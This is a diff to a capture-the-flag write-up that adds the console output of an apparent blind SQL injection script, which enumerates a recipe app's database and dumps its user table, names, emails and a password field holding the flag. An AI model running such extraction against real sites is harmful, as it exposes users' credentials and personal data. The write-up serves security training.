@@ -286,4 +286,121 @@ if __name__ == "__main__":
             readChars(data_length,column,table)
 ```
 
+- Flag result-:
+
+```bash
+root@ubuntu:/tmp# ./try.py
+[+] Number of tables-:6
+[+]Finding table Length
+[+] Table-Length:-:4
+[+] Table Found: user
+[+]Finding table Length
+[+] Table-Length:-:13
+[+] Table Found: login_attempt
+[+]Finding table Length
+[+] Table-Length:-:13
+
+[+] Table Found: login_session
+[+]Finding table Length
+[+] Table-Length:-:6
+[+] Table Found: recipe
+[+]Finding table Length
+[+] Table-Length:-:23
+[+] Table Found: personal_cookbook_entry
+[+]Finding table Length
+[+] Table-Length:-:12
+[+] Table Found: to_try_entry
+[+] Tables:['user', 'login_attempt', 'login_session', 'recipe', 'personal_cookbook_entry', 'to_try_entry']
+[+] Number of Columns-:7
+[+]Dumping Columns:table:user
+[+]Finding Columnn Length
+[+] Column-Length:-:7
+[+] Column name dumped::user_id
+[+]Finding Columnn Length
+[+] Column-Length:-:8
+[+] Column name dumped::username
+[+]Finding Columnn Length
+[+] Column-Length:-:10
+[+] Column name dumped::user_email
+[+]Finding Columnn Length
+[+] Column-Length:-:10
+[+] Column name dumped::first_name
+[+]Finding Columnn Length
+[+] Column-Length:-:9
+[+] Column name dumped::last_name
+[+]Finding Columnn Length
+[+] Column-Length:-:8
+[+] Column name dumped::password
+[+]Finding Columnn Length
+[+] Column-Length:-:11
+[+] Column name dumped::date_joined
+[+] ColumnDumped::{'user': ['user_id', 'username', 'user_email', 'first_name', 'last_name', 'password', 'date_joined']}
+[+] Number of Data's rows-:3
+[+]Dumping String:table:user:column:user_id
+[+]Finding String Length
+[+] String-Length:-:1
+[+] Column user_id dumped::1
+[+]Finding String Length
+[+] String-Length:-:1
+[+] Column user_id dumped::3
+[+]Finding String Length
+[+] String-Length:-:1
+[+] Column user_id dumped::2
+[+] Number of Data's rows-:3
+[+]Dumping String:table:user:column:username
+[+]Finding String Length
+[+] String-Length:-:5
+[+] Column username dumped::admin
+[+]Finding String Length
+[+] String-Length:-:14
+
+[+] Column username dumped::steve_and_alex
+[+]Finding String Length
+[+] String-Length:-:5
+[+] Column username dumped::cosmo
+[+] Number of Data's rows-:3
+[+]Dumping String:table:user:column:user_email
+[+]Finding String Length
+[+] String-Length:-:15
+
+[+] Column user_email dumped::admin@admin.com
+[+]Finding String Length
+[+] String-Length:-:20
+[+] Column user_email dumped::cosmo_cougar@byu.edu
+[+]Finding String Length
+[+] String-Length:-:19
+[+] Column user_email dumped::steve@minecraft.net
+[+] Number of Data's rows-:3
+[+]Dumping String:table:user:column:first_name
+[+]Finding String Length
+[+] String-Length:-:10
+[+] Column first_name dumped::AdminFirst
+[+]Finding String Length
+[+] String-Length:-:5
+[+] Column first_name dumped::Steve
+[+]Finding String Length
+[+] String-Length:-:12
+[+] Column first_name dumped::cosmopolitan
+[+] Number of Data's rows-:3
+[+]Dumping String:table:user:column:last_name
+[+]Finding String Length
+[+] String-Length:-:9
+[+] Column last_name dumped::AdminLast
+[+]Finding String Length
+[+] String-Length:-:9
+[+] Column last_name dumped::Herobrine
+[+]Finding String Length
+[+] String-Length:-:6
+[+] Column last_name dumped::cougar
+[+] Number of Data's rows-:3
+[+]Dumping String:table:user:column:password
+[+]Finding String Length
+[+] String-Length:-:58
+[+] Column password dumped::byuctf{pl34s3_p4r4m3t3r1z3_y0ur_1nputs_4nd_h4sh_p4ssw0rds}
+```
+
+- Flag-:```byuctf{pl34s3_p4r4m3t3r1z3_y0ur_1nputs_4nd_h4sh_p4ssw0rds}```
+
+![image](https://github.com/user-attachments/assets/a0b662ff-0587-45ba-a2e6-b2cf2a1e7a46)
+
 -----------------------
